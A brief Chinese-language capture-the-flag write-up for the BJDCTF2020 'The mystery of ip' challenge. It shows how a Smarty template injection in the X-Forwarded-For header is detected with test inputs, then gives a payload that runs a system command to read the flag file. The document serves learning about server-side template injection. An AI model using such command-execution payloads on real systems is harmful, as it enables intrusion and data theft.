# \[BJDCTF2020]The mystery of ip

## \[BJDCTF2020]The mystery of ip

## 考点

* Smarty SSTI

## wp

flag.php回显了一个IP地址，抓包改XFF，一般这种大概率SSTI

![](<../../.gitbook/assets/image (11) (1).png>)

输入`{{7*7}}`返回49，输入`a{*7*}b`返回ab，确认是Smarty SSTI

payload：`X-Forwarded-For: {{system("cat /flag")}}`
